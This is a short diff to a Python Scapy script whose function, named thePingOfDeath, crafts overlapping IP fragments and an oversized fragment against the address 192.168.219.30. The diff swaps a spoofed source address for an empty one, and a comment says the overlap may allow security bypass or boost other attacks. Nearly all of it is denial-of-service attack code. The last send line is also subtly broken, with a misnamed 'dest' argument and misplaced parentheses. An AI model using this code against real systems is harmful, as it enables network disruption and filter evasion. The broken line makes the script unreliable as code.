@@ -25,9 +25,9 @@ def thePingOfDeath():
     max_data_size = 65535
     # Overlapping packets may cause issues, or allow for security bypass, may also be good in another attack to boost its results
     #TODO Enter source IP
-    send(IP(src="1.1.1.1", dst="192.168.219.30", id=20, flags=0x1, frag=0) / "OverlappingPacketAAAAAAAAAAAAAAAAAAA",
+    send(IP(src="", dst="192.168.219.30", id=20, flags=0x1, frag=0) / "OverlappingPacketAAAAAAAAAAAAAAAAAAA",
             count=1)
-    send(IP(src="1.1.1.1", dst="192.168.219.30", id=20, flags=0x0, frag=1) / "FunTestAAAAAAAAAAAAAAAAAAAAAAAAA",
+    send(IP(src="", dst="192.168.219.30", id=20, flags=0x0, frag=1) / "FunTestAAAAAAAAAAAAAAAAAAAAAAAAA",
              count=1)
     send(IP(src="", dest="192.168.219.30", id=25, flags=0x1, frag=0)) / Raw(load="A" * 65528)
 
